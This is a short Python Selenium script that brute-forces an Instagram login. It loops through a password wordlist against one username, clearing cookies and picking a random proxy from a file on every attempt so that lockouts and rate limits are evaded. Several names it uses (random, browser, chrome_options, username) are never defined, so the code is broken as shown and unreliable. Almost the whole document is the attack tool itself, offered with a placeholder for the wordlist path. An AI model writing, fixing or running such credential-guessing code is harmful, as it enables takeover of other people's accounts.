from selenium import webdriver 
import time

url='https://www.instagram.com/accounts/login/?force_classic_login'
proxies = open("proxies.txt","r")
proxy_list =[]
for _ in proxies:
    proxy_list.append(_)
#"https://instagram.com")

def login(username,password):
    browser.delete_all_cookies()
    print("[+] deleted all cookies")
    prox = random.choice(proxy_list)
    print(f"[+]using proxy:{prox}\n")
    chrome_options.add_argument(f"--proxy-server={prox}")
    browser.get(url)
    time.sleep(2)
    browser.find_element_by_xpath("//*[@id=\"id_username\"]").clear()
    browser.find_element_by_xpath("//*[@id=\"id_username\"]").send_keys(username)
    browser.find_element_by_xpath("/html/body/div/section/div/div/form/p[2]/input").send_keys(password)
    try:
        browser.find_element_by_xpath("/html/body/div/section/div/div/form/p[3]/input").click()
        return 0
        #time.sleep(5)
    except:
        return 1
    
#Not Now
#browser.find_element_by_xpath("/html/body/div[5]/div/div/div/div[3]/button[2]").click()
#time.sleep(5)

#goto dms
#browser.find_element_by_xpath("/html/body/div[1]/section/nav/div[2]/div/div/div[3]/div/div[2]/a").click()
wordlist="path to yer wordlist"
passlist = open(wordlist,"r")
attempt =1
for password in passlist:
    print(f"\n[+]attempt:{attempt} trying:{password}")
    login(username,password)
    attempt+=1
    
